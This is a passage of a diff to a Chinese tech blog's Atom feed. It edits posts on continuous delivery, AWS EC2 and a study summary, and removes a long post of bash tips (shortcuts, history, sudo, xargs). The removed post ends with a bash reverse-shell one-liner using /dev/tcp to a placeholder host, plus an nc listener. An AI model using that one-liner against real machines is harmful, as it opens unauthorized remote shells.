+      &lt;h1 id=&quot;持续交付的目的&quot;&gt;&lt;a href=&quot;#持续交付的目的&quot; class=&quot;headerlink&quot; title=&quot;持续交付的目的&quot;&gt;&lt;/a&gt;持续交付的目的&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;以下问题有没有解决？&lt;/strong&gt;&lt;br&gt;“快速将产品推向市场” 与 “提供稳定、安全并可靠的IT服务” 是否可以兼得？&lt;br&gt;用更少的资源完成更多的业绩，既要保持竞争力，又要削减成本；&lt;br&gt;如何解决任务交接出现的问题，例如业务与开发，开发与运维之间；&lt;br&gt;运维人员能否和其他人一样，正常上下班，而不用在夜里或者周末加班？&lt;/p&gt;
     
     </summary>
     
+      <category term="持续交付" scheme="https://www.duyidong.com/categories/%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98/"/>
     
-      <category term="持续交付" scheme="https://www.duyidong.com/tags/%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98/"/>
     
       <category term="DevOps" scheme="https://www.duyidong.com/tags/DevOps/"/>
+    
+      <category term="持续交付" scheme="https://www.duyidong.com/tags/%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98/"/>
     
       <category term="部署与发布" scheme="https://www.duyidong.com/tags/%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%8F%91%E5%B8%83/"/>
     
@@ -1871,18 +2031,18 @@ ZQ 不保存退出
   </entry>
   
   <entry>
-    <title>AWS_EC2</title>
+    <title>AWS EC2是什么</title>
     <link href="https://www.duyidong.com/2016/09/28/AWS-EC2/"/>
     <id>https://www.duyidong.com/2016/09/28/AWS-EC2/</id>
     <published>2016-09-28T06:53:34.000Z</published>
-    <updated>2017-02-18T13:54:38.000Z</updated>
+    <updated>2017-05-04T12:26:43.000Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="AWS-EC2是什么？"><a href="#AWS-EC2是什么？" class="headerlink" title="AWS EC2是什么？"></a>AWS EC2是什么？</h1><p>Amazon Elastic Compulte Cloud(EC2)提供了可伸缩的计算资源，使你可以快速开发/部署你的应用，有了它你可以快速起一个应用，配置安全，网络，以及存储。他可以更灵活，更快地适应你对需求。</p>
+    <content type="html"><![CDATA[<p>Amazon Elastic Compulte Cloud(EC2)提供了可伸缩的计算资源，使你可以快速开发/部署你的应用，有了它你可以快速起一个应用，配置安全，网络，以及存储。他可以更灵活，更快地适应你对需求。</p>
 <a id="more"></a>
 <h2 id="EC2定义了以下规则"><a href="#EC2定义了以下规则" class="headerlink" title="EC2定义了以下规则"></a>EC2定义了以下规则</h2><ul>
 <li><strong>Instance:</strong> 虚拟计算环境</li>
 <li><strong>AMI(Amazon Machine Images):</strong> EC2环境的一个预配置</li>
-<li><strong>Instance type:</strong> instance的存储，CPU，内存，存储，网络，地位 </li>
+<li><strong>Instance type:</strong> instance的存储，CPU，内存，存储，网络，地位</li>
 <li><strong>Key pair:</strong> 用于安全登录你的instance（Amazon保存piublic key,你需要小心保存自己那份private key）</li>
 <li><strong>Instance store volumes:</strong> 临时存储数据，当你stop或者terminate你的机器的时候就会被删除</li>
 <li><strong>EBS(Amazon Elastic Block Store)</strong> 长期存储volume的数据</li>
@@ -1926,9 +2086,11 @@ ZQ 不保存退出
     
     <summary type="html">
     
-      &lt;h1 id=&quot;AWS-EC2是什么？&quot;&gt;&lt;a href=&quot;#AWS-EC2是什么？&quot; class=&quot;headerlink&quot; title=&quot;AWS EC2是什么？&quot;&gt;&lt;/a&gt;AWS EC2是什么？&lt;/h1&gt;&lt;p&gt;Amazon Elastic Compulte Cloud(EC2)提供了可伸缩的计算资源，使你可以快速开发/部署你的应用，有了它你可以快速起一个应用，配置安全，网络，以及存储。他可以更灵活，更快地适应你对需求。&lt;/p&gt;
+      &lt;p&gt;Amazon Elastic Compulte Cloud(EC2)提供了可伸缩的计算资源，使你可以快速开发/部署你的应用，有了它你可以快速起一个应用，配置安全，网络，以及存储。他可以更灵活，更快地适应你对需求。&lt;/p&gt;
     
     </summary>
+    
+      <category term="Amazon Web Services" scheme="https://www.duyidong.com/categories/Amazon-Web-Services/"/>
     
     
       <category term="AWS" scheme="https://www.duyidong.com/tags/AWS/"/>
@@ -1940,9 +2102,9 @@ ZQ 不保存退出
     <link href="https://www.duyidong.com/2016/09/01/2016%E5%85%AB%E6%9C%88%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%A1/"/>
     <id>https://www.duyidong.com/2016/09/01/2016八月学习小计/</id>
     <published>2016-09-01T11:27:38.000Z</published>
-    <updated>2017-02-18T13:54:06.000Z</updated>
+    <updated>2017-05-04T12:23:41.000Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="八月学习小计"><a href="#八月学习小计" class="headerlink" title="八月学习小计"></a>八月学习小计</h1><p>基本上讲，这两个月一直都在写文档，做PPT，提升所谓Consultant能力。<br>除此之外比较系统地学习了Shell和一些Linux有关的知识，自认为自身短板还是在技术上。</p>
+    <content type="html"><![CDATA[<p>基本上讲，这两个月一直都在写文档，做PPT，提升所谓Consultant能力。<br>除此之外比较系统地学习了Shell和一些Linux有关的知识，自认为自身短板还是在技术上。</p>
 <a id="more"></a>
 <p>个人觉得以下分析问题的方式还是比较面向过程和面向任务，比较适合团队Retro，并不是很适合做自我总结。不过还是想试一下。</p>
 <h2 id="内容回顾"><a href="#内容回顾" class="headerlink" title="内容回顾"></a>内容回顾</h2><h3 id="Technique"><a href="#Technique" class="headerlink" title="Technique"></a>Technique</h3><ul>
@@ -1997,146 +2159,14 @@ ZQ 不保存退出
     
     <summary type="html">
     
-      &lt;h1 id=&quot;八月学习小计&quot;&gt;&lt;a href=&quot;#八月学习小计&quot; class=&quot;headerlink&quot; title=&quot;八月学习小计&quot;&gt;&lt;/a&gt;八月学习小计&lt;/h1&gt;&lt;p&gt;基本上讲，这两个月一直都在写文档，做PPT，提升所谓Consultant能力。&lt;br&gt;除此之外比较系统地学习了Shell和一些Linux有关的知识，自认为自身短板还是在技术上。&lt;/p&gt;
+      &lt;p&gt;基本上讲，这两个月一直都在写文档，做PPT，提升所谓Consultant能力。&lt;br&gt;除此之外比较系统地学习了Shell和一些Linux有关的知识，自认为自身短板还是在技术上。&lt;/p&gt;
     
     </summary>
     
-    
-      <category term="小结" scheme="https://www.duyidong.com/tags/%E5%B0%8F%E7%BB%93/"/>
-    
-      <category term="Study" scheme="https://www.duyidong.com/tags/Study/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Bash学习小计</title>
-    <link href="https://www.duyidong.com/2016/08/05/Bash%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%A1/"/>
-    <id>https://www.duyidong.com/2016/08/05/Bash学习小计/</id>
-    <published>2016-08-05T00:09:15.000Z</published>
-    <updated>2017-04-12T13:17:50.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>最近一段时间在学习bash，作为一个小总结，记录一些bash使用的技巧以及知识点。</p>
-<h1 id="Shell是什么？"><a href="#Shell是什么？" class="headerlink" title="Shell是什么？"></a>Shell是什么？</h1><p>shell是一类解释性语言，通过其解释器与操作系统内核进行交互，shell分为Bshell 和Cshell两大类，我们所熟悉的bash和zsh都属于Bshell一类。shell脚本有两种执行方式，一种为交互式执行，即通常我们在Linux上的执行方式，一次只能执行一条命令（当然你可以把多条命令写到一行），多条命令不能同时执行。另一种方式为脚本执行，即把多条shell语句写到一个.sh文件里，然后在文件头#！/bin/bash调用解释器执行，这种方式的优点在于可重复执行和自动化。但shell的脚本通常不易读，所以展现shell优势的地方主要还是在交互执行中。<br>另外可以在/etc/shells文件里查看当前系统支持的shell。<br>bash作为大部分类Linux系统的标配，下面我主要围绕bash来讲。<br><a id="more"></a></p>
-<h1 id="Bash启动顺序"><a href="#Bash启动顺序" class="headerlink" title="Bash启动顺序"></a>Bash启动顺序</h1><p>1./etc/profile :此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行。并从/etc/profile.d目录的配置文件中搜集shell的设置。<br>2.~/.bash_profile:每个用户都可使用该文件输入专用于自己使用的shell信息,当用户登录时,该文件仅仅执行一次!默认情况下,他设置一些环境变量,执行用户的.bashrc文件。<br>3.~/.bashrc:该文件包含专用于你的bash shell的bash信息,当登录时以及每次打开新的shell时,该文件被读取。<br>4.~/.bash_logout:当每次退出系统(退出bash shell)时,执行该文件。</p>
-<p>注意</p>
-<pre><code>~/.bash_profile 是交互式、login 方式进入 bash 运行的
-~/.bashrc 是交互式 non-login 方式进入 bash 运行的
-通常二者设置大致相同，所以通常前者会调用后者。
-</code></pre><p>所以我们通常会吧环境变量的一些设置保存在~/.bash_profile中，把一些命令行，脚本调用写到~/.bashrc里面</p>
-<h1 id="Bash快捷键"><a href="#Bash快捷键" class="headerlink" title="Bash快捷键"></a>Bash快捷键</h1><h2 id="用好你的Control键"><a href="#用好你的Control键" class="headerlink" title="用好你的Control键"></a>用好你的Control键</h2><p>Control键是所有类Unix系统（Mac, Linux）下一个非常有用的按键，但也是一个经常被忽视的按键，特别是在Mac平台下，Command键完全代替了在Windows平台下的Ctrl键，很多人不清楚为什么Apple又额外加了一个Control键，我想这和著名的Emacs编辑器有关，Emacs下有很多方便的快捷键，其中很多都需要用到Control键，Mac系统就原生继承了很多这些快捷键，下面就根据我在实际开发过程中遇到的具体情况来总结一下如何用好Control键，效率真能提高不少。</p>
-<h3 id="Control的常用组合键"><a href="#Control的常用组合键" class="headerlink" title="Control的常用组合键"></a>Control的常用组合键</h3><p>移动类</p>
-<blockquote>
-<ul>
-<li>Control-F 前进光标 (效果同右方向键)</li>
-<li>Control-B 后退光标（效果同左方向键)</li>
-<li>Control-P 光标上移（效果同上方向键）</li>
-<li>Control-N 光标下移（效果同下方向键）</li>
-<li>Control-A 光标移动到行首</li>
-<li>Control-E 光标移动到行尾</li>
-</ul>
-</blockquote>
-<p> 删除类</p>
-<blockquote>
-<ul>
-<li>Control-D 删除光标后面的一个字符</li>
-<li>Control-H 删除光标前面的一个字符</li>
-<li>Control-K 删除当前行光标以后的所有字符</li>
-<li>Control-W 删除光标前的一个单词</li>
-<li><p>Control-U 删除当前行的所有字符<br>其它类</p>
-</li>
-<li><p>Control-T 交换光标两边的字符</p>
-</li>
-<li>Control-L 清屏(仅适用于终端下)<h3 id="一些常用场景"><a href="#一些常用场景" class="headerlink" title="一些常用场景"></a>一些常用场景</h3></li>
-</ul>
-</blockquote>
-<ol>
-<li><p>通常情况下，上下左右键都远离主键盘区，如果在你高速打字的过程中需要移动输入光标位置，这个时候直接通过上下左右键就不得不将右手移出主键盘区，就会降低输入的速度，通常这个时候你就可以通过Control的组合键达到快速移动光标的目的。再比如你在一些IDE(Xcode,Android Studio等)里面选择代码补全的不同候选项时，就可以通过Control-P与Control-N来达到切换选择不同候选项的操作.</p>
-</li>
-<li><p>Mac的键盘上没有Home与End键, 如果你想将光标快速移动到行首与行尾就比较麻烦(当然你可以通过Command与-&gt; 或Command与&lt;-实现,但这样你又需要去操作方向键, 方向键远离主键盘区, 速度势必会降低), 这时你就可以通过Control-A 与 Control-E实现, 这两个组合键非常适合在终端下使用</p>
-</li>
-<li><p>有些时候你在终端下输入了很长的命令, 但发现输入有误, 需要完全删除重新输入, 通常情况下你都会使用Delete键去做, 但Delete只能一次删除一个字符, 速度很慢, 这时你就可以通过Control-U键快速的达到清除当前所有输入的目的, 再比如你当前的输入只有从中间某个位置向后是错误的, 这时你可以通过Control-B或Control-F将光标移动到对应位置, 然后再利用Control-K快速达到删除当前光标后所有输入的目的</p>
-</li>
-<li><p>在输入的过程中如果发现个别字符不对需要删除重新输入, 你当然可以通过Delete键达到, 但 Delete键和方向键一样有点远, 更方便的你可以通过Control-D 与 Control-H实现, 还有些时候错的不是一个或几个字符,而是一个或几个单词你可以Control-W达到</p>
-</li>
-<li><p>在终端下如何清屏? 很多人都是通过输入clear达到, 但如果这时你终端里正输入的有一条待执行的命令,这条命令的输出可能有很多你想清一下屏后再执行, 你怎么办,总不能删除当前命令后再输入clear命令, 然后再重新输入刚才的那条命令吧, 其实这时你可以通过Control-L组合键达到目的,这个差不多是我在终端下用的最多的一个快捷键了.</p>
-</li>
-</ol>
-<h3 id="关于编辑模式的设置"><a href="#关于编辑模式的设置" class="headerlink" title="关于编辑模式的设置"></a>关于编辑模式的设置</h3><p>在交互式执行bash中，可以通过set -o的方式查看当前编辑模式，我们通常采用set -o emaces的方式设置以上快捷键为可操作，需要注意的是，如果你不选择一种快捷键设置”set +o emaces”你连最熟悉的上下键切换history命令都用不了。</p>
-<h2 id="Alias"><a href="#Alias" class="headerlink" title="Alias"></a>Alias</h2><p>bash的一个将长命令替换为短命令的方式，可以直接在bash交互执行中输入alias查看已经被设置的快捷键，以<code>alias la=&#39;ls -al&#39;</code>的方式设置快捷键，当然直接键入命令只对当前打开的shell有效，如果想长期生效，我们通常的做法是把它写到/etc/profile.d/目录下的shell里面，会被/etc/profile调用的一个全局配置。当然在工作环境中我们会把它配到home目录下（因为/etc目录下会对所有用户生效，想想也是不科学的）所以我们更经常写到~/.bashrc里面。</p>
-<h1 id="关于环境变量"><a href="#关于环境变量" class="headerlink" title="关于环境变量"></a>关于环境变量</h1><p>bash的环境变量可以用<code>set</code> <code>env</code> 两种方式查看，这里主要说一下两种变量的区别，当你在命令行中用赋值的方式申明一个变量，(example: TEXT=123)，这个变量只存在set中，即当前shell生效，不会传递到subshell里面，如果是文本执行的脚本，这种变量申明方式定义的变量也只会在文件内生效，如果想让别的脚本调用这些变量,可以通过export的方式将变量导入到env里面，可以理解为全局变量。<br>这里我还想提一个比较有意思的环境变量PS1，你可以将它设置为<code>export PS1=&quot;(\!) \[\e[31m\] \[\A\] \[\e[32m\]\u@\h \[\e[34m\]\w \[\e[30m\]$&quot;</code>试一下，是个非常有意思的值。</p>
-<h1 id="Windows和Linux脚本的转换问题"><a href="#Windows和Linux脚本的转换问题" class="headerlink" title="Windows和Linux脚本的转换问题"></a>Windows和Linux脚本的转换问题</h1><p>我们都知道windows和Linux的文件类型不同，那么在windows下编写的脚本如何在Linux下执行呢？当我们从windows下拷贝一个文件到Linux上，可以使用<code>cat -A</code>命令查看到文件隐藏字符，发现有很多脏数据，于是可以用<code>dos2unix file.sh</code>的方式把文件转化过来。</p>
-<h1 id="关于历史命令"><a href="#关于历史命令" class="headerlink" title="关于历史命令"></a>关于历史命令</h1><p>history可以查看当前用户的历史命令，每个用户的history藏在~/.bash_hitory下，可以查看。<br>可以使用<code>!!</code>执行上一条命令 <code>![number]</code>执行第number条命令，<code>！[string]</code>执行以string开头的上一条命令<br>另外control+r可以根据字符串快捷搜索历史命令.</p>
-<h1 id="关于参数传递"><a href="#关于参数传递" class="headerlink" title="关于参数传递"></a>关于参数传递</h1><ol>
-<li>`` $()<br> 这两种方式是相同的，即重新打开一个shell执行完退出，并使用返回值代替脚本调用部分内容</li>
-<li><p>| xargs 区别于管道符，是将前面的命令作为后面命令的命令参数，而管道符是将前面输出作为后面命令的标准输入。<br> 再解释一 | 和 | xargs 的区别：</p>
-<pre><code> echo -l | ls 输出： 等同于 ls
- echo -l | xargs ls 输出 等同于 ls -l
-</code></pre><p> 好了，剩下的自己体会。</p>
-</li>
-<li>find 的 -exec<br> xargs有个缺点，在大量执行命令（成千上万）的时候可能因为执行的命令过多失败，而find的-exec 是为逐个命令执行，不会遇到此类问题，作为-exec的标配，应该在后面加上{} \;末尾的\;其实是转意，恩，此处按下不表。</li>
-</ol>
-<h1 id="关于文件查找"><a href="#关于文件查找" class="headerlink" title="关于文件查找"></a>关于文件查找</h1><p>find 是一个事实文件便利工具，比较强大,可以用<code>find / -name &quot;*.sh&quot;</code>的方式查找/中包含.sh结尾的文件，如果遇到一堆permission deny的问题可以用输出重定向的方式解决<code>find /-name &quot;*.sh&quot; 2&gt;&gt; /dev/null</code>（2为文件状态符，0表示标准输入，1表示标准输出，2表示错误输出，&gt;&gt;为重定向，表示将输出叠加导入到后面的文件中,/dev/null为Linux系统的垃圾桶）,这个命令比较常用，但是效率很低，占用内存也比较高，推荐使用locate命令，类似于window系统里的everything，将文件信息保存在/var/lib/mlocate/mlocatedb数据库里，使用<code>updatedb</code>更新数据库，<code>locate filename</code>的方式查找文件，更高效，速度也更快。</p>
-<h1 id="关于bash-history"><a href="#关于bash-history" class="headerlink" title="关于bash_history"></a>关于bash_history</h1><p>放一个bash_histroy的命令：<a href="http://rockhong.github.io/history-in-bash.html" target="_blank" rel="external">http://rockhong.github.io/history-in-bash.html</a><br>bash使用的历史命令会先写入内存（在退出subshell之前在.bash_history中不可见，也不可传递到子进程），在退出shell的时候写入子进程。这里说几个对bash_history的需求以及解决方案。</p>
-<h2 id="多个终端不覆盖history"><a href="#多个终端不覆盖history" class="headerlink" title="多个终端不覆盖history:"></a>多个终端不覆盖history:</h2><p>如果同一用户在不同终端登录，bash_histroy只能保存最后一个用户登录的bash_histroy，解决这个问题：<br>简单来说，你在.bashrc里面添加这句就够了：</p>
-<pre><code>shopt -s histappend
-</code></pre><h2 id="history上限设大："><a href="#history上限设大：" class="headerlink" title="history上限设大："></a>history上限设大：</h2><pre><code># 设置历史记录条数
-export HISTFILESIZE=40000000
-# 设置显示历史记录条数
-export HISTSIZE=10000
-</code></pre><h2 id="history定期备份"><a href="#history定期备份" class="headerlink" title="history定期备份"></a>history定期备份</h2><p>很多情况下我们希望保存更多的bash_history以方便以后查阅，但是如果把.bash_history设置得很大的话，bash在启动时会占用大量内存（100000条大概要10M），这是我们不想看到的，所以应该养成定期备份的习惯，推荐把bash_histroy按时间备份比如每天+data&gt;&gt;bash_histroy.back.</p>
-<h1 id="关于sudo"><a href="#关于sudo" class="headerlink" title="关于sudo"></a>关于sudo</h1><p>这里我要说的是用户切换<br>大家都知道su命令是用来切换用户的，su - 可以完全切换到用户（新开一个shell，加载~/.bash_profile及~/.bashrc），但是在有的情况下，sudo -iu 也可以切换用户。<br>首先：<code>sudo -i</code> 是以root身份新开一个shell，<code>sudo -u &lt;user&gt; &lt;command&gt;</code>是以user身份执行command，现在我要说一条神奇的命令：</p>
-<pre><code>sudo -iu &lt;user&gt;
-</code></pre><p>它等价于<code>sudo -u root &lt;user_shell&gt;</code><br>是不是很神奇？<br>我们来看一个更神奇的:<br>visudo(当然需要root身份或者sudo权限)，编辑/etc/sudoers（或者/etc/sudoers.d/文件下的文件），添加如下代码：</p>
-<pre><code>user1 ALL=(user2) NOPASSWD: &lt;user_shell&gt;
-</code></pre><p>就可以让user1免密码sudo到user2，是不是很有趣。<br>顺便说一下你可以使用这个配置来管理所有sudo权限。</p>
-<h1 id="另外记几个Linux下的常用工具"><a href="#另外记几个Linux下的常用工具" class="headerlink" title="另外记几个Linux下的常用工具"></a>另外记几个Linux下的常用工具</h1><pre><code>1. tldr 查看文档用的，安装比较复杂，而且是联网查找，虚拟机上速度可能会比较慢
-sudo yum -y install epel-release
-sudo yum -y install python-pip
-pip install --upgrade pip
-pip install tldr
-2. tmux 据说是screen的进阶版，分屏用的
-3. lsof端口查看
-4. nc网络瑞士军刀，占用端口:nc -k -l -p 8080 2&gt;&gt; /dev/null
-5. shudown 可以定时关机，重启，取消关机
-6. pstree 进程树
-7. grep 逐行扫描文件
-8. wc 统计
-9. top 查看内存等信息
-10. rpm 包管理（二进制包）
-11. sl 仅仅是为了好玩，小火车开过。。
-12. cmatrix 也是为了好玩，黑客帝国
-</code></pre><h1 id="最后说一下Bash和Zsh哪个好"><a href="#最后说一下Bash和Zsh哪个好" class="headerlink" title="最后说一下Bash和Zsh哪个好"></a>最后说一下Bash和Zsh哪个好</h1><p>当然是Zsh好啦，具体怎么好，你不需要太知道，总之Zsh比Bash很多地方都要强大，在Bash的基础上增加了一些配置。。</p>
-<h1 id="记一个Bash遇到的小坑"><a href="#记一个Bash遇到的小坑" class="headerlink" title="记一个Bash遇到的小坑"></a>记一个Bash遇到的小坑</h1><p>Bash的变量只会被扫描替换一遍，所以当我们的变量里包含其他变量我们需要扫描两遍需要使用eval，类似于python的eval()将字符串当做表达式，用法如下：</p>
-<pre><code>#!/bin/sh
-
-s=Start
-Start_ops=hello
-name=$1
-echo &quot;$s&quot;&quot;_ops&quot;
-eval echo \$&quot;$s&quot;_ops &quot;$name&quot;
-</code></pre><p>运行 ./test.sh world<br>打印出hello word</p>
-<p><strong>但是！！</strong>我现在要说的是请不要使用这种方式，因为邪恶的eval会引起bash注入的问题，就提示到这里，剩下的自己感受。。</p>
-<h1 id="推荐一个Linux命令查询的网站"><a href="#推荐一个Linux命令查询的网站" class="headerlink" title="推荐一个Linux命令查询的网站"></a>推荐一个Linux命令查询的网站</h1><p><a href="http://man.linuxde.net/" target="_blank" rel="external">http://man.linuxde.net/</a></p>
-<h1 id="再列一堆Linux下贼好用的工具"><a href="#再列一堆Linux下贼好用的工具" class="headerlink" title="再列一堆Linux下贼好用的工具"></a>再列一堆Linux下贼好用的工具</h1><p><a href="https://gist.github.com/ADU-21/170a6d0f8756935cead9361bdea0bc67" target="_blank" rel="external">https://gist.github.com/ADU-21/170a6d0f8756935cead9361bdea0bc67</a></p>
-<p>另外： 后面还得写一个关于vim的快捷操作的文章。</p>
-<h1 id="Bash-反弹Shell"><a href="#Bash-反弹Shell" class="headerlink" title="Bash 反弹Shell"></a>Bash 反弹Shell</h1><pre><code>bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1
-# 然后在x.x.x.x这台server上执行：
-nc -l 2333
-</code></pre>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;最近一段时间在学习bash，作为一个小总结，记录一些bash使用的技巧以及知识点。&lt;/p&gt;
-&lt;h1 id=&quot;Shell是什么？&quot;&gt;&lt;a href=&quot;#Shell是什么？&quot; class=&quot;headerlink&quot; title=&quot;Shell是什么？&quot;&gt;&lt;/a&gt;Shell是什么？&lt;/h1&gt;&lt;p&gt;shell是一类解释性语言，通过其解释器与操作系统内核进行交互，shell分为Bshell 和Cshell两大类，我们所熟悉的bash和zsh都属于Bshell一类。shell脚本有两种执行方式，一种为交互式执行，即通常我们在Linux上的执行方式，一次只能执行一条命令（当然你可以把多条命令写到一行），多条命令不能同时执行。另一种方式为脚本执行，即把多条shell语句写到一个.sh文件里，然后在文件头#！/bin/bash调用解释器执行，这种方式的优点在于可重复执行和自动化。但shell的脚本通常不易读，所以展现shell优势的地方主要还是在交互执行中。&lt;br&gt;另外可以在/etc/shells文件里查看当前系统支持的shell。&lt;br&gt;bash作为大部分类Linux系统的标配，下面我主要围绕bash来讲。&lt;br&gt;
-    
-    </summary>
+      <category term="学习总结" scheme="https://www.duyidong.com/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
     
     
       <category term="学习" scheme="https://www.duyidong.com/tags/%E5%AD%A6%E4%B9%A0/"/>
-    
-      <category term="Linux" scheme="https://www.duyidong.com/tags/Linux/"/>
-    
-      <category term="Shell" scheme="https://www.duyidong.com/tags/Shell/"/>
     
       <category term="小计" scheme="https://www.duyidong.com/tags/%E5%B0%8F%E8%AE%A1/"/>
     
